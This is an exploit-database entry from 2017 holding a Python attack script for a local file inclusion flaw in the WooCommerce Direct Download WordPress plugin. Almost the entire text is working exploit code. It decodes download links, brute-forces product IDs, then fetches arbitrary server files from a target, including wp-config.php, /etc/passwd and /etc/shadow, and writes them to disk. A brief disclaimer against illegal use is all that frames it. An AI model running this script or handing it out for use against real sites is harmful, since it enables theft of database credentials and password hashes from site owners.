@@ -1,0 +1,307 @@
+id: 26722
+date: 01/18/2017
+title: WordPress WooCommerce Direct Download Local File Inclusion Exploit
+author: Diego Celdran Morell
+cves: 
+
+#lfi_attack_for_direct_download_woocommerce.py
+
+#
+# Author: Diego Celdran Morell
+# Web: http://www.diegoceldran.es/
+# Fecha Ultima actualizacion: 15/01/2017
+# Version: V1.0
+# No me hago responsable del mal uso que se le pueda dar a esta herramienta
+#
+
+import os;
+
+
+try:
+  #pip install urlopen
+  import requests;
+
+except (Exception):
+  #ejecutar pip install urlopen
+  print(" Installing required modules...");
+  os.system("pip install requests");
+  from urllib2 import urlopen
+
+
+try:
+  #pip install urlopen
+  import base64;
+
+except (Exception):
+  #ejecutar pip install urlopen
+  print(" Installing required modules...");
+  os.system("pip install base64");
+  import base64
+
+
+def make_exploit(download_link):
+  lnk_download = download_link;
+
+  parts     =  lnk_download.split("/direct-download/");
+  toDecode  =  parts[1];
+  domain    =  parts[0];
+
+  if (toDecode[:-1] == "/"):
+    toDecode = toDecode[:count(toDecode)-1];
+
+  else:
+    toDecode = toDecode;
+
+  decoded = str(base64.b64decode(toDecode.encode('ascii')).decode('utf-8'));
+
+  productID = decoded.split("|")[0];
+
+  print(" ");
+  print(" ProductID: " + productID);
+  print(" ");
+  eject_exploit(productID, domain);
+
+
+def eject_exploit(productID, domain):
+  print(" Select a file to download");
+  print(" [0] wp-config.php");
+  print(" [1] /etc/passwd");
+  print(" [2] /etc/shadow");
+  print(" or select another path to file to download");
+  print(" ");
+  optDownload = input(" >>> ");
+  print(" ");
+
+
+  if (domain[:7] == "http://"):
+    domain = domain;
+
+  elif (domain[:8] == "https://"):
+    domain = domain;
+
+  else:
+    domain = "http://" + domain;
+
+
+  if (optDownload == "0"):
+    fileToDownload = "wp-config.php";
+
+  elif (optDownload == "1"):
+    fileToDownload = "/etc/passwd";
+
+  elif (optDownload == "2"):
+    fileToDownload = "/etc/shadow"
+
+  else:
+    fileToDownload = optDownload;
+
+  url = domain + "/direct-download/" + base64.b64encode((str(productID) + "|" + fileToDownload).encode('ascii')).decode('utf-8');
+
+  print(" Downloading " + fileToDownload + " file from " + domain);
+  print(" Accesing to " + url);
+  print(" ");
+
+  req = requests.get(url);
+
+  if (req.status_code == 200):
+    print(" File downloaded correctly!");
+
+    fileName = fileToDownload.replace("\\", "/");
+    file = fileName.split("/");
+    fileText = str(file[-1]);
+
+    f = open(fileText, 'w');
+    
+    f.write(req.text);
+
+    f.close();
+
+    print(" Acces to this file in: " + str(os.path.dirname(os.path.abspath(__file__))) + " folder");
+    print(" ");
+
+  else:
+    print(" [-] This domain is not vulnerable");
+
+  eject_exploit(productID, domain);
+
+
+def get_product_id(domain, minID, maxID):
+  if(maxID == False):
+    maxID = 999999999999999999;
+
+  url = "";
+
+  if (domain[:7] == "http://"):
+    print(domain[:7]);
+    url = domain;
+
+  elif (domain[:8] == "https://"):
+    prin(domain[:8]);
+    url = domain;
+
+  else:
+    url = "http://" + domain;
+
+
+  if (url[:-1] == "/"):
+    url = url + "direct-download/";
+
+  else:
+    url = url + "/direct-download/";
+
+
+  actuallyId = minID;
+  idProduct = 0;
+  
+  while (idProduct == 0 and actuallyId <= maxID):
+    encodedURL = base64.b64encode((str(actuallyId) + "|").encode('ascii'));
+    urlToTest = url + str(encodedURL.decode("utf-8")) + "/"
+    print(" Testing ID: " + str(actuallyId) + "; Getting URL: " + urlToTest);
+    #print("");
+    
+    req = requests.get(urlToTest);
+    
+    if (req.status_code == 200):
+      
+      if("This product is not available for direct free download." in req.text):
+        # testing text you recibe
+        print(" [-] No product fount with ID: " + str(actuallyId));
+        print(" ");
+
+      else:
+        print(" [+] A product ID was fount: " + str(actuallyId));
+        print(" ");
+        idProduct = actuallyId;
+
+    else:
+      print(" [-] This domain is not vulnerable");
+    
+    actuallyId = actuallyId+1;
+
+  if (idProduct != 0):
+    eject_exploit(idProduct, domain);
+    
+
+def testin_get_a_download_link(domain):
+  print(" Do you want try to find a valid URL for the website?");
+  print(" [0] no, exit");
+  print(" [1] yes, it may have a long time");
+  print(" ");
+  test_find = input(" >>> ");
+  print(" ");
+
+  if (test_find == "1"):
+    # Proseguir
+    print(" Please select the minimun id to find the product (0 to none; minimun id to start recomended: 400)");
+    minID = input(" >>> ");
+    print(" ");
+
+    if (minID == "0"):
+      minID = 1;
+
+    else:
+      minID = int(minID);
+
+    print(" Please select the maximun id to find the product (0 to stop manually when you want)");
+    maxID = input(" >>> ");
+    print(" ");
+
+    if (maxID == "0"):
+      maxID = False;
+
+    else:
+      maxID = int(maxID);
+
+    get_product_id(domain, minID, maxID);
+
+  else:
+    exit();
+
+
+def get_download_link(domain):
+  print(" Please");
+  print(" Set a download link from the website: ");
+  print(" [0] I don't have any download link");
+  print(" ");
+  download_link = input(" >>> ");
+  print(" ");
+
+  if (download_link == "0"):
+    testin_get_a_download_link(domain);
+
+  else:
+    make_exploit(download_link);
+
+
+def get_download_link_no_domain():
+  print(" Please");
+  print(" Set a download link from the website: ");
+  print(" [0] I don't have any download link");
+  print(" ");
+  download_link = input(" >>> ");
+  print(" ");
+
+  if (download_link == "0"):
+    print(" Please, select the domain to attack");
+    domain = input(" >>> ");
+    print("");
+    testin_get_a_download_link(domain);
+
+  else:
+    make_exploit(download_link);
+
+
+def check_vulnerable_domain(domain = "diegoceldran.es"):
+  # Check if domain/direct-download/a/ return any thing
+  if (domain[:7] == "http://"):
+    url = domain;
+
+  elif (domain[:8] == "https://"):
+    url = domain;
+
+  else:
+    url = "http://" + domain;
+
+  if (url[:-1] == "/"):
+    url = url + "direct-download/a/";
+
+  else:
+    url = url + "/direct-download/a/";
+
+
+  req = requests.get(url);
+  if (req.status_code == 200):
+    print(" The web site: " + url + " respond: ");
+    print(" " + req.text);
+    print(" [+] This domain is maybe vulnerable");
+    print(" ");
+
+    get_download_link(domain);
+
+  else:
+    print(" [-] This domain is not vulnerable");
+
+print(" ");
+print(" LFI Attack for Direct Download Woocommerce plugin is started!");
+print(" ");
+print(" If you're using this module out of BrutiFramework, please, visit");
+print(" http://www.diegoceldran.es/brutiframework-alfa/ to Download ");
+print(" BrutiFramework from the oficial site. Thanks!");
+print(" ");
+print(" IMPORTANT:\n NO USE THIS EXPLOIT FOR ILEGAL PURPOSES");
+print(" ");
+print(" Select the target: (ej: www.diegoceldran.es)");
+print(" [0] Omit the checking progress");
+print(" ");
+domain = input(" >>> ");
+if (domain != "0"):
+  print(" ");
+  print(" Checking " + domain + "...");
+  print(" ");
+  check_vulnerable_domain(domain);
+
+else:
+  print(" ");
+  get_download_link_no_domain();
+
+#  0day.today [2023-03-25]  #
